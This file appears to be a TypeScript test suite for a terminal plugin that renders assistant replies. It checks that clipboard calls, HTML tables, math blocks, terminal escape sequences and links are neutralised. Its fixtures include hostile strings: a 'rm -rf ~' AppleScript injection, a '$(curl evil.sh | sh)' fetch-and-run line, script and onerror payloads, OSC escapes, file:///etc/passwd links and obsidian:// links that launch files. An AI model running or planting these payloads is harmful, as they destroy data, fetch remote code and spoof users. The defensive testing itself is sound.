import { expect, mock, test } from 'claude-code/testing'

import type { ClipboardBackend } from '../hooks/clipboard'
import { clipboardCommand } from '../hooks/clipboard'
import { tableHtml } from '../hooks/html'
import { mathOf } from '../hooks/latex'
import type { Block } from '../hooks/markdown'
import { parse } from '../hooks/markdown'
import { claudeAt, linksHttp } from './claude-version'

const HOSTILE = [
  `'; do shell script "rm -rf ~" --`,
  '"; $(curl evil.sh | sh); `id` \\',
  '</script><script>alert(1)</script>',
  '\u001b]52;c;cHduZWQ=\u0007\u001b[2J',
  'line\r\nbreak\u0000nul',
  'שלום ‮gnp.exe',
]

const reply = (text: string) => ({ plugin: 'prismantis', component: 'AssistantMessage' as const, props: { text, isFirstOfReply: true }, viewport: { columns: 120, rows: 40 }, surface: 'terminal' as const })

const blockOf = (source: string, kind: Block['kind']) => parse(source, { numbers: false, paths: false }).find(b => b.kind === kind)!

test('reply text reaches the clipboard helpers only through stdin, never their argv', () => {
  for (const backend of ['macos', 'linux', 'windows'] as ClipboardBackend[]) {
    const plain = clipboardCommand(backend, '<b>a</b>', 'a', 'C:\\Windows')
    for (const bad of HOSTILE) {
      const command = clipboardCommand(backend, bad, bad, 'C:\\Windows')
      expect(command.argv).toEqual(plain.argv)
      const back = JSON.parse(command.stdin) as { html: string; text: string }
      expect(back.html).toBe(bad)
      expect(back.text).toBe(backend === 'windows' ? bad.replace(/\r?\n/g, '\r\n') : bad)
    }
  }
})

test('table html escapes hostile cells and keeps only web links', () => {
  const html = tableHtml(blockOf(`| a | b |\n|---|---|\n| </td><script>x()</script> | [go](javascript:alert(1)) |\n| <img src=x onerror=y()> | [f](file:///etc/passwd) |`, 'table') as Extract<Block, { kind: 'table' }>)
  expect(html).not.toMatch(/<script|<img|javascript:|file:/i)
  expect(html).toContain('&lt;script&gt;')
})

test('a formula reaches the math renderer as one stdin line', () => {
  const tex = mathOf(blockOf('```math\nx^2\n\\\\ y\n\ninjected\n```', 'code'))
  expect(tex).not.toBeNull()
  expect(tex).not.toContain('\n')
})

test('terminal control sequences in a reply are never drawn', async $ => {
  const bad = '\u001b]8;;file:///etc/passwd\u0007x\u001b]8;;\u0007 \u001b[2J \u001b]52;c;cHduZWQ=\u0007 \u009b31m'
  const ui = await $.ui.mount(reply(`hi ${bad}\n\n| a |\n|---|\n| ${bad} |\n\n> ${bad}\n\n- ${bad}\n\n\`\`\`bash\necho ${bad}\n\`\`\``))
  const texts = (await ui.findAll({ type: 'Text' })).map(n => n.text ?? '')
  expect(texts.length).toBeGreaterThan(4)
  expect(texts.filter(t => /[\u001b\u0007\u009b]/.test(t))).toEqual([])
})

test('an unterminated OSC escape strips only itself, not the rest of the reply', () => {
  const blocks = parse('before \u001b]8;;x rest\n\nsecond\n\n| a |\n|---|\n| 1 |', { numbers: false, paths: false })
  expect(blocks.map(b => b.kind)).toEqual(['paragraph', 'paragraph', 'table'])
  expect(blocks.map(b => b.raw).join('\n')).not.toMatch(/[\u001b\u0007]/)
})

const TARGETS: [href: string, linkedWithFileLinks: boolean][] = [
  ['https://a.dev', true],
  ['file:///Applications/Calculator.app', false],
  ['FILE:///C:/Windows/System32/cmd.exe', false],
  ['file://evil.example/share/x.exe', false],
  ['file:///tmp/notes.md', true],
  ['smb://host/share', false],
  ['ms-msdt:/id', false],
  ['javascript:alert(1)', false],
]

const everyBlock = (links: string) => `${links}\n\n> ${links}\n\n> [!NOTE]\n> ${links}\n\n- x\n  - ${links}\n\n| a |\n|---|\n| ${links} |\n\nn[^a]\n\n[^a]: ${links}`

const targetLinks = TARGETS.map(([href]) => `[${href}](${href})`).join(' ')

test('only web links in a reply are clickable, in every block, while file links are off', async $ => {
  const ui = await $.ui.mount(reply(everyBlock(targetLinks)))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs.length).toBe(6)
  expect(hrefs.filter(h => h !== 'https://a.dev')).toEqual([])
})

test('with file links on, only web links and file links labelled with their own address are clickable, as written, in every block', async ($, on) => {
  claudeAt(on, '2.1.289')
  mock.env(on, { FORCE_HYPERLINK: '1', HOME: '/home/me' })
  if (!(await linksHttp($.ui.mount(reply('[/x.md](file:///x.md)'))))) return
  const ui = await $.ui.mount(reply(everyBlock(targetLinks)))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  const allowed = TARGETS.filter(([, linked]) => linked).map(([href]) => href)
  expect(hrefs).toEqual(Array.from({ length: 6 }, () => allowed).flat())
  await ui.unmount()
})

test('with file links on, a file link named anything but its own path draws as text with its target, in every block', async ($, on) => {
  claudeAt(on, '2.1.289')
  mock.env(on, { FORCE_HYPERLINK: '1', HOME: '/home/me' })
  if (!(await linksHttp($.ui.mount(reply('[/x.md](file:///x.md)'))))) return
  const ui = await $.ui.mount(reply(everyBlock(TARGETS.map(([href], i) => `[t${i}](${href})`).join(' '))))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs).toEqual(Array.from({ length: 6 }, () => 'https://a.dev'))
  expect(await ui.find({ type: 'Text', text: /^t1 \(file:\/\/\/Applications\/Calculator\.app\)$/ })).toBeDefined()
  await ui.unmount()
})

const APP_ACTIONS = [
  'obsidian://new?vault=notes&name=todo&content=x&overwrite=true',
  'obsidian://adv-uri?vault=notes&commandid=x',
  'obsidian://open?vault=notes&file=todo&append=x',
  'obsidian://open?vault=notes&file=todo&%61ppend=x',
  'obsidian:///notes/todo.md?prepend=x',
  'obsidian://open?vault=notes&file=todo&append',
  'obsidian://open?vault=notes&file=x.terminal',
  'obsidian://open?vault=notes&File=x%2Ecommand',
  'obsidian://open?vault=notes&file=x?.command',
  'obsidian://open?path=/Users/me/Tool.app/',
  'obsidian:///Users/me/run.command',
]

test('with app links on, app links that write notes, run commands, or launch files stay text, in every block', async ($, on) => {
  claudeAt(on, '2.1.294')
  if (!(await linksHttp($.ui.mount(reply('[x](vscode://file/C:/x.md)'))))) return
  const ui = await $.ui.mount({ ...reply(everyBlock(`${targetLinks} ${APP_ACTIONS.map(href => `[${href}](${href})`).join(' ')}`)), viewport: { columns: 120, rows: 40, isFullscreen: false } })
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs.filter(h => !/^(https|file):/i.test(h))).toEqual([])
  await ui.unmount()
})

const toolUse = (tool: string, input: unknown) => ({ plugin: 'prismantis', surface: 'terminal' as const, component: 'ToolUse' as const, props: { tool_use_id: `x-${tool}`, tool, input, isRunning: false, isErrored: false, isInterrupted: false } })

test('with path links on, an extensionless file never links and an extensionless folder links once a stat finds a folder', async ($, on) => {
  claudeAt(on, '2.1.289')
  mock.env(on, { FORCE_HYPERLINK: '1', HOME: '/home/me' })
  on('session.root', () => ({ value: '/work/app' }))
  const clock = mock.clock(on)
  on('fs.stat', (_, e) => ({ value: { kind: /^\/(usr\/local|work\/app\/docs)$/.test(e.path.replace(/\\/g, '/').replace(/^[A-Za-z]:(?=\/)/, '')) ? 'dir' as const : 'file' as const, size: 1, mtimeMs: 0, isLink: false } }))
  if (!(await linksHttp($.ui.mount(reply('[/x.md](file:///x.md)'))))) return
  const ui = await $.ui.mount(reply('Run /bin/sh, /usr/bin/say or /usr/bin/python3.12, see [/bin/sh](file:///bin/sh), `bin/tool`, docs/ and /usr/local.'))
  await clock.settle()
  expect((await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))).toEqual(['file:///work/app/docs/', 'file:///usr/local'])
  await ui.unmount()
  for (const [tool, input, hrefs] of [['Read', { file_path: '/usr/bin/say' }, []], ['Grep', { pattern: 'x', path: '/usr/local' }, ['file:///usr/local']]] as const) {
    const row = await $.ui.mount(toolUse(tool, input))
    await clock.settle()
    const again = await $.ui.mount(toolUse(tool, input))
    expect((await again.findAll({ type: 'Link' })).map(l => String(l.props.href))).toEqual([...hrefs])
    await row.unmount()
    await again.unmount()
  }
})
